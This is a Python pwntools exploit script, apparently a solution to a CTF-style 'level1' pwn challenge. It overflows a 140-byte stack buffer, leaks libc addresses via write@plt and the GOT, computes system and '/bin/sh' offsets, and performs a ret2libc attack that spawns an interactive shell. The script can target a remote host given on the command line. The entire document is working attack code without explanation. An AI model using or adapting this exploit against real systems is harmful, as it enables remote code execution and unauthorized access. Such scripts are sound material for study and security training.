#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
arch_64 = 0
exe = "./level1"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
libc = e.libc
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
#    libc = ELF("./libc.so.6")
else:
    p = process([exe])

if arch_64:
#    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    arena = 0x3c4b20
    context.arch = "amd64"
else:
#    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    arena = 0x1b2780
    context.arch = "i386"

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

write_plt = e.plt["write"]
read_got = e.got["read"]
write_got = e.got["write"]

vul = 0x804847B

#ru("\n")
p1 = flat(["A"*140,write_plt,vul,1,write_got,4])
sl(p1)
write = u32(r(4))
print "write : "+hex(write)

#ru("\n")
p1 = flat(["A"*140,write_plt,vul,1,read_got,4])
sl(p1)
read = u32(r(4))
print "read : "+hex(read)

libc_base = write - 0x0d43c0
sys  = libc_base + 0x03a940
bin_sh = libc_base + 0x15902b


p1 = flat(["A"*140,sys,vul,bin_sh])
sl(p1)
p.interactive()

